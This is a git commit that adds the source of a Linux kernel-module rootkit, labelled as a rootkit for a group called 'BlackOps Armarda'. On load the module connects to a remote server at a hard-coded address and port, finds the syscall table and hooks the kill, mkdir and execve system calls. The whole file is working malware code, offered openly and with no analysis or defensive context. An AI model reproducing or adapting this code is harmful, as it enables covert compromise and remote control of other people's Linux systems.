ce66384cb59a7353bc4190a34570db0d5d3abf25
Artemis's Angel <artemisesangel@protonmail.com>
2023-04-18 09:14:20 +0100

    Create rootkit.c
    originally https://github.com/ArtemisesAngel/Aegis-Suite/blob/main/Lelantos/lelantos.c

---
+++ Rootkit/rootkit.c
@@ -0,0 +1,40 @@
+/*=================*\
+kernel module imports
+\*=================*/
+#include <linux/init.h> //macros used to mark up functions   e.g. __init __exit
+#include <linux/module.h> // core header for loading module into kernel
+#include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
+#include <linux/string.h>
+
+#include <custom/syscall_table.h> //functions for getting sycall syscall_table
+#include <custom/hooks.h> //functions for hooking syscalls
+#include <custom/hooked_syscalls.h> //functions of the hooked syscalls
+
+static int __init ModuleInit(void) {
+  printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
+  server_connect("10.1.1.2", 42069);
+  get_syscall_table();
+  install_hook(&sys_kill);
+  install_hook(&sys_mkdir);
+  install_hook(&sys_execve);
+  orig_kill = sys_kill.orig_syscall;
+  orig_mkdir = sys_mkdir.orig_syscall;
+  orig_execve = sys_execve.orig_syscall;
+  return 0;
+}
+static void __exit ModuleExit(void) {
+  remove_hook(&sys_kill);
+  remove_hook(&sys_mkdir);
+  server_print("[rootkit] module removed!!!");
+  printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
+}
+
+
+
+
+module_init(ModuleInit);
+module_exit(ModuleExit);
+MODULE_AUTHOR("Artemis's Angel"); //author
+MODULE_DESCRIPTION("Rootkit for BlackOps Armarda"); //description
+MODULE_LICENSE("GPL");// GPL license
+MODULE_VERSION("0.01"); //version
